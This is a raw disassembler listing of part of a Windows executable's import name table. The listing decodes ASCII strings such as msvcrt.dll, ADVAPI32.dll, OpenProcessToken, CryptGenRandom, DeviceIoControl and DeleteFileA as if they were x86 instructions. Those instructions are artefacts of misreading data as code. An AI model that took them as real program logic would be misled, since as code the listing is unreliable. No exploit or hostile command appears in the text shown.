 1009b61:	74 66                	je     0x1009bc9
 1009b63:	00 0a                	add    %cl,(%edx)
 1009b65:	03 73 74             	add    0x74(%ebx),%esi
 1009b68:	72 63                	jb     0x1009bcd
 1009b6a:	68 72 00 00 07       	push   $0x7000072
 1009b6f:	02 5f 73             	add    0x73(%edi),%bl
 1009b72:	74 72                	je     0x1009be6
 1009b74:	6e                   	outsb  %ds:(%esi),(%dx)
 1009b75:	69 63 6d 70 00 03 02 	imul   $0x2030070,0x6d(%ebx),%esp
 1009b7c:	5f                   	pop    %edi
 1009b7d:	73 74                	jae    0x1009bf3
 1009b7f:	72 69                	jb     0x1009bea
 1009b81:	63 6d 70             	arpl   %ebp,0x70(%ebp)
 1009b84:	00 00                	add    %al,(%eax)
 1009b86:	16                   	push   %ss
 1009b87:	03 73 74             	add    0x74(%ebx),%esi
 1009b8a:	72 72                	jb     0x1009bfe
 1009b8c:	63 68 72             	arpl   %ebp,0x72(%eax)
 1009b8f:	00 05 02 5f 73 74    	add    %al,0x74735f02
 1009b95:	72 6c                	jb     0x1009c03
 1009b97:	77 72                	ja     0x1009c0b
 1009b99:	00 18                	add    %bl,(%eax)
 1009b9b:	03 73 74             	add    0x74(%ebx),%esi
 1009b9e:	72 73                	jb     0x1009c13
 1009ba0:	74 72                	je     0x1009c14
 1009ba2:	00 00                	add    %al,(%eax)
 1009ba4:	14 03                	adc    $0x3,%al
 1009ba6:	73 74                	jae    0x1009c1c
 1009ba8:	72 6e                	jb     0x1009c18
 1009baa:	63 70 79             	arpl   %esi,0x79(%eax)
 1009bad:	00 cc                	add    %cl,%ah
 1009baf:	00 5f 63             	add    %bl,0x63(%edi)
 1009bb2:	5f                   	pop    %edi
 1009bb3:	65 78 69             	gs js  0x1009c1f
 1009bb6:	74 00                	je     0x1009bb8
 1009bb8:	fd                   	std
 1009bb9:	00 5f 65             	add    %bl,0x65(%edi)
 1009bbc:	78 69                	js     0x1009c27
 1009bbe:	74 00                	je     0x1009bc0
 1009bc0:	4f                   	dec    %edi
 1009bc1:	00 5f 58             	add    %bl,0x58(%edi)
 1009bc4:	63 70 74             	arpl   %esi,0x74(%eax)
 1009bc7:	46                   	inc    %esi
 1009bc8:	69 6c 74 65 72 00 cf 	imul   $0xcf0072,0x65(%esp,%esi,2),%ebp
 1009bcf:	00 
 1009bd0:	5f                   	pop    %edi
 1009bd1:	63 65 78             	arpl   %esp,0x78(%ebp)
 1009bd4:	69 74 00 00 9c 02 65 	imul   $0x7865029c,0x0(%eax,%eax,1),%esi
 1009bdb:	78 
 1009bdc:	69 74 00 00 73 00 5f 	imul   $0x5f5f0073,0x0(%eax,%eax,1),%esi
 1009be3:	5f 
 1009be4:	69 6e 69 74 65 6e 76 	imul   $0x766e6574,0x69(%esi),%ebp
 1009beb:	00 72 00             	add    %dh,0x0(%edx)
 1009bee:	5f                   	pop    %edi
 1009bef:	5f                   	pop    %edi
 1009bf0:	67 65 74 6d          	addr16 gs je 0x1009c61
 1009bf4:	61                   	popa
 1009bf5:	69 6e 61 72 67 73 00 	imul   $0x736772,0x61(%esi),%ebp
 1009bfc:	42                   	inc    %edx
 1009bfd:	01 5f 69             	add    %ebx,0x69(%edi)
 1009c00:	6e                   	outsb  %ds:(%esi),(%dx)
 1009c01:	69 74 74 65 72 6d 00 	imul   $0xa0006d72,0x65(%esp,%esi,2),%esi
 1009c08:	a0 
 1009c09:	00 5f 5f             	add    %bl,0x5f(%edi)
 1009c0c:	73 65                	jae    0x1009c73
 1009c0e:	74 75                	je     0x1009c85
 1009c10:	73 65                	jae    0x1009c77
 1009c12:	72 6d                	jb     0x1009c81
 1009c14:	61                   	popa
 1009c15:	74 68                	je     0x1009c7f
 1009c17:	65 72 72             	gs jb  0x1009c8c
 1009c1a:	00 00                	add    %al,(%eax)
 1009c1c:	bd 00 5f 61 64       	mov    $0x64615f00,%ebp
 1009c21:	6a 75                	push   $0x75
 1009c23:	73 74                	jae    0x1009c99
 1009c25:	5f                   	pop    %edi
 1009c26:	66 64 69 76 00 00 85 	imul   $0x8500,%fs:0x0(%esi),%si
 1009c2d:	00 5f 5f             	add    %bl,0x5f(%edi)
 1009c30:	70 5f                	jo     0x1009c91
 1009c32:	5f                   	pop    %edi
 1009c33:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
 1009c36:	6d                   	insl   (%dx),%es:(%edi)
 1009c37:	6f                   	outsl  %ds:(%esi),(%dx)
 1009c38:	64 65 00 00          	fs add %al,%gs:(%eax)
 1009c3c:	8a 00                	mov    (%eax),%al
 1009c3e:	5f                   	pop    %edi
 1009c3f:	5f                   	pop    %edi
 1009c40:	70 5f                	jo     0x1009ca1
 1009c42:	5f                   	pop    %edi
 1009c43:	66 6d                	insw   (%dx),%es:(%edi)
 1009c45:	6f                   	outsl  %ds:(%esi),(%dx)
 1009c46:	64 65 00 00          	fs add %al,%gs:(%eax)
 1009c4a:	9e                   	sahf
 1009c4b:	00 5f 5f             	add    %bl,0x5f(%edi)
 1009c4e:	73 65                	jae    0x1009cb5
 1009c50:	74 5f                	je     0x1009cb1
 1009c52:	61                   	popa
 1009c53:	70 70                	jo     0x1009cc5
 1009c55:	5f                   	pop    %edi
 1009c56:	74 79                	je     0x1009cd1
 1009c58:	70 65                	jo     0x1009cbf
 1009c5a:	00 00                	add    %al,(%eax)
 1009c5c:	f4                   	hlt
 1009c5d:	00 5f 65             	add    %bl,0x65(%edi)
 1009c60:	78 63                	js     0x1009cc5
 1009c62:	65 70 74             	gs jo  0x1009cd9
 1009c65:	5f                   	pop    %edi
 1009c66:	68 61 6e 64 6c       	push   $0x6c646e61
 1009c6b:	65 72 33             	gs jb  0x1009ca1
 1009c6e:	00 00                	add    %al,(%eax)
 1009c70:	6d                   	insl   (%dx),%es:(%edi)
 1009c71:	73 76                	jae    0x1009ce9
 1009c73:	63 72 74             	arpl   %esi,0x74(%edx)
 1009c76:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
 1009c79:	6c                   	insb   (%dx),%es:(%edi)
 1009c7a:	00 00                	add    %al,(%eax)
 1009c7c:	dd 00                	fldl   (%eax)
 1009c7e:	5f                   	pop    %edi
 1009c7f:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
 1009c82:	74 72                	je     0x1009cf6
 1009c84:	6f                   	outsl  %ds:(%esi),(%dx)
 1009c85:	6c                   	insb   (%dx),%es:(%edi)
 1009c86:	66 70 00             	data16 jo 0x1009c89
 1009c89:	00 36                	add    %dh,(%esi)
 1009c8b:	01 49 6e             	add    %ecx,0x6e(%ecx)
 1009c8e:	69 74 69 61 74 65 53 	imul   $0x79536574,0x61(%ecx,%ebp,2),%esi
 1009c95:	79 
 1009c96:	73 74                	jae    0x1009d0c
 1009c98:	65 6d                	gs insl (%dx),%es:(%edi)
 1009c9a:	53                   	push   %ebx
 1009c9b:	68 75 74 64 6f       	push   $0x6f647475
 1009ca0:	77 6e                	ja     0x1009d10
 1009ca2:	41                   	inc    %ecx
 1009ca3:	00 f7                	add    %dh,%bh
 1009ca5:	00 47 65             	add    %al,0x65(%edi)
 1009ca8:	74 4c                	je     0x1009cf6
 1009caa:	65 6e                	outsb  %gs:(%esi),(%dx)
 1009cac:	67 74 68             	addr16 je 0x1009d17
 1009caf:	53                   	push   %ebx
 1009cb0:	69 64 00 00 1a 01 47 	imul   $0x6547011a,0x0(%eax,%eax,1),%esp
 1009cb7:	65 
 1009cb8:	74 54                	je     0x1009d0e
 1009cba:	6f                   	outsl  %ds:(%esi),(%dx)
 1009cbb:	6b 65 6e 49          	imul   $0x49,0x6e(%ebp),%esp
 1009cbf:	6e                   	outsb  %ds:(%esi),(%dx)
 1009cc0:	66 6f                	outsw  %ds:(%esi),(%dx)
 1009cc2:	72 6d                	jb     0x1009d31
 1009cc4:	61                   	popa
 1009cc5:	74 69                	je     0x1009d30
 1009cc7:	6f                   	outsl  %ds:(%esi),(%dx)
 1009cc8:	6e                   	outsb  %ds:(%esi),(%dx)
 1009cc9:	00 ac 01 4f 70 65 6e 	add    %ch,0x6e65704f(%ecx,%eax,1)
 1009cd0:	50                   	push   %eax
 1009cd1:	72 6f                	jb     0x1009d42
 1009cd3:	63 65 73             	arpl   %esp,0x73(%ebp)
 1009cd6:	73 54                	jae    0x1009d2c
 1009cd8:	6f                   	outsl  %ds:(%esi),(%dx)
 1009cd9:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
 1009cdd:	00 1d 00 41 6c 6c    	add    %bl,0x6c6c4100
 1009ce3:	6f                   	outsl  %ds:(%esi),(%dx)
 1009ce4:	63 61 74             	arpl   %esp,0x74(%ecx)
 1009ce7:	65 41                	gs inc %ecx
 1009ce9:	6e                   	outsb  %ds:(%esi),(%dx)
 1009cea:	64 49                	fs dec %ecx
 1009cec:	6e                   	outsb  %ds:(%esi),(%dx)
 1009ced:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
 1009cf4:	65 
 1009cf5:	53                   	push   %ebx
 1009cf6:	69 64 00 00 a0 00 43 	imul   $0x724300a0,0x0(%eax,%eax,1),%esp
 1009cfd:	72 
 1009cfe:	79 70                	jns    0x1009d70
 1009d00:	74 52                	je     0x1009d54
 1009d02:	65 6c                	gs insb (%dx),%es:(%edi)
 1009d04:	65 61                	gs popa
 1009d06:	73 65                	jae    0x1009d6d
 1009d08:	43                   	inc    %ebx
 1009d09:	6f                   	outsl  %ds:(%esi),(%dx)
 1009d0a:	6e                   	outsb  %ds:(%esi),(%dx)
 1009d0b:	74 65                	je     0x1009d72
 1009d0d:	78 74                	js     0x1009d83
 1009d0f:	00 96 00 43 72 79    	add    %dl,0x79724300(%esi)
 1009d15:	70 74                	jo     0x1009d8b
 1009d17:	47                   	inc    %edi
 1009d18:	65 6e                	outsb  %gs:(%esi),(%dx)
 1009d1a:	52                   	push   %edx
 1009d1b:	61                   	popa
 1009d1c:	6e                   	outsb  %ds:(%esi),(%dx)
 1009d1d:	64 6f                	outsl  %fs:(%esi),(%dx)
 1009d1f:	6d                   	insl   (%dx),%es:(%edi)
 1009d20:	00 00                	add    %al,(%eax)
 1009d22:	85 00                	test   %eax,(%eax)
 1009d24:	43                   	inc    %ebx
 1009d25:	72 79                	jb     0x1009da0
 1009d27:	70 74                	jo     0x1009d9d
 1009d29:	41                   	inc    %ecx
 1009d2a:	63 71 75             	arpl   %esi,0x75(%ecx)
 1009d2d:	69 72 65 43 6f 6e 74 	imul   $0x746e6f43,0x65(%edx),%esi
 1009d34:	65 78 74             	gs js  0x1009dab
 1009d37:	41                   	inc    %ecx
 1009d38:	00 00                	add    %al,(%eax)
 1009d3a:	3a 02                	cmp    (%edx),%al
 1009d3c:	53                   	push   %ebx
 1009d3d:	65 74 53             	gs je  0x1009d93
 1009d40:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
 1009d44:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%ecx,%edi,2),%esi
 1009d4b:	72 
 1009d4c:	69 70 74 6f 72 44 61 	imul   $0x6144726f,0x74(%eax),%esi
 1009d53:	63 6c 00 10          	arpl   %ebp,0x10(%eax,%eax,1)
 1009d57:	00 41 64             	add    %al,0x64(%ecx)
 1009d5a:	64 41                	fs inc %ecx
 1009d5c:	63 63 65             	arpl   %esp,0x65(%ebx)
 1009d5f:	73 73                	jae    0x1009dd4
 1009d61:	41                   	inc    %ecx
 1009d62:	6c                   	insb   (%dx),%es:(%edi)
 1009d63:	6c                   	insb   (%dx),%es:(%edi)
 1009d64:	6f                   	outsl  %ds:(%esi),(%dx)
 1009d65:	77 65                	ja     0x1009dcc
 1009d67:	64 41                	fs inc %ecx
 1009d69:	63 65 00             	arpl   %esp,0x0(%ebp)
 1009d6c:	33 01                	xor    (%ecx),%eax
 1009d6e:	49                   	dec    %ecx
 1009d6f:	6e                   	outsb  %ds:(%esi),(%dx)
 1009d70:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
 1009d77:	65 
 1009d78:	41                   	inc    %ecx
 1009d79:	63 6c 00 34          	arpl   %ebp,0x34(%eax,%eax,1)
 1009d7d:	01 49 6e             	add    %ecx,0x6e(%ecx)
 1009d80:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
 1009d87:	65 
 1009d88:	53                   	push   %ebx
 1009d89:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
 1009d8d:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%ecx,%edi,2),%esi
 1009d94:	72 
 1009d95:	69 70 74 6f 72 00 00 	imul   $0x726f,0x74(%eax),%esi
 1009d9c:	41                   	inc    %ecx
 1009d9d:	44                   	inc    %esp
 1009d9e:	56                   	push   %esi
 1009d9f:	41                   	inc    %ecx
 1009da0:	50                   	push   %eax
 1009da1:	49                   	dec    %ecx
 1009da2:	33 32                	xor    (%edx),%esi
 1009da4:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
 1009da7:	6c                   	insb   (%dx),%es:(%edi)
 1009da8:	00 00                	add    %al,(%eax)
 1009daa:	e9 01 47 65 74       	jmp    0x7565e4b0
 1009daf:	56                   	push   %esi
 1009db0:	65 72 73             	gs jb  0x1009e26
 1009db3:	69 6f 6e 45 78 41 00 	imul   $0x417845,0x6e(%edi),%ebp
 1009dba:	b5 02                	mov    $0x2,%ch
 1009dbc:	52                   	push   %edx
 1009dbd:	65 61                	gs popa
 1009dbf:	64 46                	fs inc %esi
 1009dc1:	69 6c 65 00 00 1c 03 	imul   $0x53031c00,0x0(%ebp,%eiz,2),%ebp
 1009dc8:	53 
 1009dc9:	65 74 46             	gs je  0x1009e12
 1009dcc:	69 6c 65 50 6f 69 6e 	imul   $0x746e696f,0x50(%ebp,%eiz,2),%ebp
 1009dd3:	74 
 1009dd4:	65 72 00             	gs jb  0x1009dd7
 1009dd7:	00 6f 02             	add    %ch,0x2(%edi)
 1009dda:	4d                   	dec    %ebp
 1009ddb:	6f                   	outsl  %ds:(%esi),(%dx)
 1009ddc:	76 65                	jbe    0x1009e43
 1009dde:	46                   	inc    %esi
 1009ddf:	69 6c 65 45 78 41 00 	imul   $0xc4004178,0x45(%ebp,%eiz,2),%ebp
 1009de6:	c4 
 1009de7:	02 52 65             	add    0x65(%edx),%dl
 1009dea:	6d                   	insl   (%dx),%es:(%edi)
 1009deb:	6f                   	outsl  %ds:(%esi),(%dx)
 1009dec:	76 65                	jbe    0x1009e53
 1009dee:	44                   	inc    %esp
 1009def:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
 1009df6:	79 41                	jns    0x1009e39
 1009df8:	00 00                	add    %al,(%eax)
 1009dfa:	71 01                	jno    0x1009dfd
 1009dfc:	47                   	inc    %edi
 1009dfd:	65 74 4c             	gs je  0x1009e4c
 1009e00:	61                   	popa
 1009e01:	73 74                	jae    0x1009e77
 1009e03:	45                   	inc    %ebp
 1009e04:	72 72                	jb     0x1009e78
 1009e06:	6f                   	outsl  %ds:(%esi),(%dx)
 1009e07:	72 00                	jb     0x1009e09
 1009e09:	00 4b 00             	add    %cl,0x0(%ebx)
 1009e0c:	43                   	inc    %ebx
 1009e0d:	72 65                	jb     0x1009e74
 1009e0f:	61                   	popa
 1009e10:	74 65                	je     0x1009e77
 1009e12:	44                   	inc    %esp
 1009e13:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
 1009e1a:	79 41                	jns    0x1009e5d
 1009e1c:	00 00                	add    %al,(%eax)
 1009e1e:	df 01                	filds  (%ecx)
 1009e20:	47                   	inc    %edi
 1009e21:	65 74 54             	gs je  0x1009e78
 1009e24:	69 63 6b 43 6f 75 6e 	imul   $0x6e756f43,0x6b(%ebx),%esp
 1009e2b:	74 00                	je     0x1009e2d
 1009e2d:	00 15 03 53 65 74    	add    %dl,0x74655303
 1009e33:	45                   	inc    %ebp
 1009e34:	72 72                	jb     0x1009ea8
 1009e36:	6f                   	outsl  %ds:(%esi),(%dx)
 1009e37:	72 4d                	jb     0x1009e86
 1009e39:	6f                   	outsl  %ds:(%esi),(%dx)
 1009e3a:	64 65 00 00          	fs add %al,%gs:(%eax)
 1009e3e:	f8                   	clc
 1009e3f:	00 46 72             	add    %al,0x72(%esi)
 1009e42:	65 65 4c             	gs gs dec %esp
 1009e45:	69 62 72 61 72 79 00 	imul   $0x797261,0x72(%edx),%esp
 1009e4c:	a0 01 47 65 74       	mov    0x74654701,%al
 1009e51:	50                   	push   %eax
 1009e52:	72 6f                	jb     0x1009ec3
 1009e54:	63 41 64             	arpl   %eax,0x64(%ecx)
 1009e57:	64 72 65             	fs jb  0x1009ebf
 1009e5a:	73 73                	jae    0x1009ecf
 1009e5c:	00 00                	add    %al,(%eax)
 1009e5e:	52                   	push   %edx
 1009e5f:	02 4c 6f 61          	add    0x61(%edi,%ebp,2),%cl
 1009e63:	64 4c                	fs dec %esp
 1009e65:	69 62 72 61 72 79 41 	imul   $0x41797261,0x72(%edx),%esp
 1009e6c:	00 00                	add    %al,(%eax)
 1009e6e:	c1 01 47             	roll   $0x47,(%ecx)
 1009e71:	65 74 53             	gs je  0x1009ec7
 1009e74:	79 73                	jns    0x1009ee9
 1009e76:	74 65                	je     0x1009edd
 1009e78:	6d                   	insl   (%dx),%es:(%edi)
 1009e79:	44                   	inc    %esp
 1009e7a:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
 1009e81:	79 41                	jns    0x1009ec4
 1009e83:	00 34 00             	add    %dh,(%eax,%eax,1)
 1009e86:	43                   	inc    %ebx
 1009e87:	6c                   	insb   (%dx),%es:(%edi)
 1009e88:	6f                   	outsl  %ds:(%esi),(%dx)
 1009e89:	73 65                	jae    0x1009ef0
 1009e8b:	48                   	dec    %eax
 1009e8c:	61                   	popa
 1009e8d:	6e                   	outsb  %ds:(%esi),(%dx)
 1009e8e:	64 6c                	fs insb (%dx),%es:(%edi)
 1009e90:	65 00 8a 00 44 65 76 	add    %cl,%gs:0x76654400(%edx)
 1009e97:	69 63 65 49 6f 43 6f 	imul   $0x6f436f49,0x65(%ebx),%esp
 1009e9e:	6e                   	outsb  %ds:(%esi),(%dx)
 1009e9f:	74 72                	je     0x1009f13
 1009ea1:	6f                   	outsl  %ds:(%esi),(%dx)
 1009ea2:	6c                   	insb   (%dx),%es:(%edi)
 1009ea3:	00 53 00             	add    %dl,0x0(%ebx)
 1009ea6:	43                   	inc    %ebx
 1009ea7:	72 65                	jb     0x1009f0e
 1009ea9:	61                   	popa
 1009eaa:	74 65                	je     0x1009f11
 1009eac:	46                   	inc    %esi
 1009ead:	69 6c 65 41 00 53 01 	imul   $0x47015300,0x41(%ebp,%eiz,2),%ebp
 1009eb4:	47 
 1009eb5:	65 74 44             	gs je  0x1009efc
 1009eb8:	72 69                	jb     0x1009f23
 1009eba:	76 65                	jbe    0x1009f21
 1009ebc:	54                   	push   %esp
 1009ebd:	79 70                	jns    0x1009f2f
 1009ebf:	65 41                	gs inc %ecx
 1009ec1:	00 16                	add    %dl,(%esi)
 1009ec3:	02 48 65             	add    0x65(%eax),%cl
 1009ec6:	61                   	popa
 1009ec7:	70 46                	jo     0x1009f0f
 1009ec9:	72 65                	jb     0x1009f30
 1009ecb:	65 00 00             	add    %al,%gs:(%eax)
 1009ece:	f3 00 46 6f          	repz add %al,0x6f(%esi)
 1009ed2:	72 6d                	jb     0x1009f41
 1009ed4:	61                   	popa
 1009ed5:	74 4d                	je     0x1009f24
 1009ed7:	65 73 73             	gs jae 0x1009f4d
 1009eda:	61                   	popa
 1009edb:	67 65 41             	addr16 gs inc %ecx
 1009ede:	00 00                	add    %al,(%eax)
 1009ee0:	51                   	push   %ecx
 1009ee1:	02 4c 65 61          	add    0x61(%ebp,%eiz,2),%cl
 1009ee5:	76 65                	jbe    0x1009f4c
 1009ee7:	43                   	inc    %ebx
 1009ee8:	72 69                	jb     0x1009f53
 1009eea:	74 69                	je     0x1009f55
 1009eec:	63 61 6c             	arpl   %esp,0x6c(%ecx)
 1009eef:	53                   	push   %ebx
 1009ef0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
 1009ef5:	6e                   	outsb  %ds:(%esi),(%dx)
 1009ef6:	00 00                	add    %al,(%eax)
 1009ef8:	83 00 44             	addl   $0x44,(%eax)
 1009efb:	65 6c                	gs insb (%dx),%es:(%edi)
 1009efd:	65 74 65             	gs je  0x1009f65
 1009f00:	46                   	inc    %esi
 1009f01:	69 6c 65 41 00 98 00 	imul   $0x45009800,0x41(%ebp,%eiz,2),%ebp
 1009f08:	45 
 1009f09:	6e                   	outsb  %ds:(%esi),(%dx)
 1009f0a:	74 65                	je     0x1009f71
 1009f0c:	72 43                	jb     0x1009f51
 1009f0e:	72 69                	jb     0x1009f79
 1009f10:	74 69                	je     0x1009f7b
 1009f12:	63 61 6c             	arpl   %esp,0x6c(%ecx)
 1009f15:	53                   	push   %ebx
 1009f16:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
 1009f1b:	6e                   	outsb  %ds:(%esi),(%dx)
 1009f1c:	00 00                	add    %al,(%eax)
 1009f1e:	5f                   	pop    %edi
 1009f1f:	03 54 65 72          	add    0x72(%ebp,%eiz,2),%edx
 1009f23:	6d                   	insl   (%dx),%es:(%edi)
 1009f24:	69 6e 61 74 65 50 72 	imul   $0x72506574,0x61(%esi),%ebp
 1009f2b:	6f                   	outsl  %ds:(%esi),(%dx)
 1009f2c:	63 65 73             	arpl   %esp,0x73(%ebp)
 1009f2f:	73 00                	jae    0x1009f31
 1009f31:	00 8f 03 57 61 69    	add    %cl,0x69615703(%edi)
 1009f37:	74 46                	je     0x1009f7f
 1009f39:	6f                   	outsl  %ds:(%esi),(%dx)
 1009f3a:	72 4d                	jb     0x1009f89
 1009f3c:	75 6c                	jne    0x1009faa
 1009f3e:	74 69                	je     0x1009fa9
 1009f40:	70 6c                	jo     0x1009fae
 1009f42:	65 4f                	gs dec %edi
 1009f44:	62 6a 65             	bound  %ebp,0x65(%edx)
 1009f47:	63 74 73 00          	arpl   %esi,0x0(%ebx,%esi,2)
 1009f4b:	00 50 00             	add    %dl,0x0(%eax)
 1009f4e:	43                   	inc    %ebx
 1009f4f:	72 65                	jb     0x1009fb6
 1009f51:	61                   	popa
 1009f52:	74 65                	je     0x1009fb9
 1009f54:	45                   	inc    %ebp
 1009f55:	76 65                	jbe    0x1009fbc
 1009f57:	6e                   	outsb  %ds:(%esi),(%dx)
 1009f58:	74 57                	je     0x1009fb1
 1009f5a:	00 00                	add    %al,(%eax)
 1009f5c:	16                   	push   %ss
 1009f5d:	03 53 65             	add    0x65(%ebx),%edx
 1009f60:	74 45                	je     0x1009fa7
 1009f62:	76 65                	jbe    0x1009fc9
 1009f64:	6e                   	outsb  %ds:(%esi),(%dx)
 1009f65:	74 00                	je     0x1009f67
 1009f67:	00 57 03             	add    %dl,0x3(%edi)
 1009f6a:	53                   	push   %ebx
 1009f6b:	6c                   	insb   (%dx),%es:(%edi)
 1009f6c:	65 65 70 00          	gs gs jo 0x1009f70
 1009f70:	13 03                	adc    (%ebx),%eax
 1009f72:	53                   	push   %ebx
 1009f73:	65 74 45             	gs je  0x1009fbb
 1009f76:	6e                   	outsb  %ds:(%esi),(%dx)
 1009f77:	76 69                	jbe    0x1009fe2
 1009f79:	72 6f                	jb     0x1009fea
 1009f7b:	6e                   	outsb  %ds:(%esi),(%dx)
 1009f7c:	6d                   	insl   (%dx),%es:(%edi)
 1009f7d:	65 6e                	outsb  %gs:(%esi),(%dx)
 1009f7f:	74 56                	je     0x1009fd7
 1009f81:	61                   	popa
 1009f82:	72 69                	jb     0x1009fed
 1009f84:	61                   	popa
 1009f85:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
 1009f89:	00 58 01             	add    %bl,0x1(%eax)
 1009f8c:	47                   	inc    %edi
 1009f8d:	65 74 45             	gs je  0x1009fd5
 1009f90:	6e                   	outsb  %ds:(%esi),(%dx)
 1009f91:	76 69                	jbe    0x1009ffc
 1009f93:	72 6f                	jb     0x100a004
 1009f95:	6e                   	outsb  %ds:(%esi),(%dx)
 1009f96:	6d                   	insl   (%dx),%es:(%edi)
 1009f97:	65 6e                	outsb  %gs:(%esi),(%dx)
 1009f99:	74 56                	je     0x1009ff1
 1009f9b:	61                   	popa
 1009f9c:	72 69                	jb     0x100a007
 1009f9e:	61                   	popa
 1009f9f:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
 1009fa3:	00 95 03 57 69 64    	add    %dl,0x64695703(%ebp)
 1009fa9:	65 43                	gs inc %ebx
 1009fab:	68 61 72 54 6f       	push   $0x6f547261
 1009fb0:	4d                   	dec    %ebp
 1009fb1:	75 6c                	jne    0x100a01f
 1009fb3:	74 69                	je     0x100a01e
 1009fb5:	42                   	inc    %edx
 1009fb6:	79 74                	jns    0x100a02c
 1009fb8:	65 00 10             	add    %dl,%gs:(%eax)
 1009fbb:	02 48 65             	add    0x65(%eax),%cl
 1009fbe:	61                   	popa
 1009fbf:	70 41                	jo     0x100a002
 1009fc1:	6c                   	insb   (%dx),%es:(%edi)
 1009fc2:	6c                   	insb   (%dx),%es:(%edi)
 1009fc3:	6f                   	outsl  %ds:(%esi),(%dx)
 1009fc4:	63 00                	arpl   %eax,(%eax)
 1009fc6:	29 03                	sub    %eax,(%ebx)
 1009fc8:	53                   	push   %ebx
 1009fc9:	65 74 4c             	gs je  0x100a018
 1009fcc:	61                   	popa
 1009fcd:	73 74                	jae    0x100a043
 1009fcf:	45                   	inc    %ebp
 1009fd0:	72 72                	jb     0x100a044
 1009fd2:	6f                   	outsl  %ds:(%esi),(%dx)
 1009fd3:	72 00                	jb     0x1009fd5
 1009fd5:	00 a5 03 57 72 69    	add    %ah,0x69725703(%ebp)
 1009fdb:	74 65                	je     0x100a042
 1009fdd:	46                   	inc    %esi
 1009fde:	69 6c 65 00 6e 02 4d 	imul   $0x6f4d026e,0x0(%ebp,%eiz,2),%ebp
 1009fe5:	6f 
 1009fe6:	76 65                	jbe    0x100a04d
 1009fe8:	46                   	inc    %esi
 1009fe9:	69 6c 65 41 00 b9 00 	imul   $0x4500b900,0x41(%ebp,%eiz,2),%ebp
 1009ff0:	45 
 1009ff1:	78 69                	js     0x100a05c
 1009ff3:	74 50                	je     0x100a045
 1009ff5:	72 6f                	jb     0x100a066
 1009ff7:	63 65 73             	arpl   %esp,0x73(%ebp)
 1009ffa:	73 00                	jae    0x1009ffc
 1009ffc:	81 00 44 65 6c 65    	addl   $0x656c6544,(%eax)
 100a002:	74 65                	je     0x100a069
 100a004:	43                   	inc    %ebx
 100a005:	72 69                	jb     0x100a070
 100a007:	74 69                	je     0x100a072
 100a009:	63 61 6c             	arpl   %esp,0x6c(%ecx)
 100a00c:	53                   	push   %ebx
 100a00d:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
 100a012:	6e                   	outsb  %ds:(%esi),(%dx)
 100a013:	00 ee                	add    %ch,%dh
 100a015:	00 46 6c             	add    %al,0x6c(%esi)
 100a018:	75 73                	jne    0x100a08d
 100a01a:	68 46 69 6c 65       	push   $0x656c6946
 100a01f:	42                   	inc    %edx
 100a020:	75 66                	jne    0x100a088
 100a022:	66 65 72 73          	data16 gs jb 0x100a099
 100a026:	00 00                	add    %al,(%eax)
 100a028:	91                   	xchg   %eax,%ecx
 100a029:	03 57 61             	add    0x61(%edi),%edx
 100a02c:	69 74 46 6f 72 53 69 	imul   $0x6e695372,0x6f(%esi,%eax,2),%esi
 100a033:	6e 
 100a034:	67 6c                	insb   (%dx),%es:(%di)
 100a036:	65 4f                	gs dec %edi
 100a038:	62 6a 65             	bound  %ebp,0x65(%edx)
 100a03b:	63 74 00 7d          	arpl   %esi,0x7d(%eax,%eax,1)
 100a03f:	02 4f 70             	add    0x70(%edi),%cl
 100a042:	65 6e                	outsb  %gs:(%esi),(%dx)
 100a044:	45                   	inc    %ebp
 100a045:	76 65                	jbe    0x100a0ac
 100a047:	6e                   	outsb  %ds:(%esi),(%dx)
 100a048:	74 41                	je     0x100a08b
 100a04a:	00 00                	add    %al,(%eax)
 100a04c:	42                   	inc    %edx
 100a04d:	01 47 65             	add    %eax,0x65(%edi)
 100a050:	74 43                	je     0x100a095
 100a052:	75 72                	jne    0x100a0c6
 100a054:	72 65                	jb     0x100a0bb
 100a056:	6e                   	outsb  %ds:(%esi),(%dx)
 100a057:	74 50                	je     0x100a0a9
 100a059:	72 6f                	jb     0x100a0ca
 100a05b:	63 65 73             	arpl   %esp,0x73(%ebp)
 100a05e:	73 00                	jae    0x100a060
 100a060:	5e                   	pop    %esi
 100a061:	01 47 65             	add    %eax,0x65(%edi)
 100a064:	74 46                	je     0x100a0ac
 100a066:	69 6c 65 41 74 74 72 	imul   $0x69727474,0x41(%ebp,%eiz,2),%ebp
 100a06d:	69 
 100a06e:	62 75 74             	bound  %esi,0x74(%ebp)
 100a071:	65 73 41             	gs jae 0x100a0b5
 100a074:	00 00                	add    %al,(%eax)
 100a076:	10 01                	adc    %al,(%ecx)
 100a078:	47                   	inc    %edi
 100a079:	65 74 43             	gs je  0x100a0bf
 100a07c:	6f                   	outsl  %ds:(%esi),(%dx)
 100a07d:	6d                   	insl   (%dx),%es:(%edi)
 100a07e:	6d                   	insl   (%dx),%es:(%edi)
 100a07f:	61                   	popa
 100a080:	6e                   	outsb  %ds:(%esi),(%dx)
 100a081:	64 4c                	fs dec %esp
 100a083:	69 6e 65 41 00 7d 01 	imul   $0x17d0041,0x65(%esi),%ebp
 100a08a:	47                   	inc    %edi
 100a08b:	65 74 4d             	gs je  0x100a0db
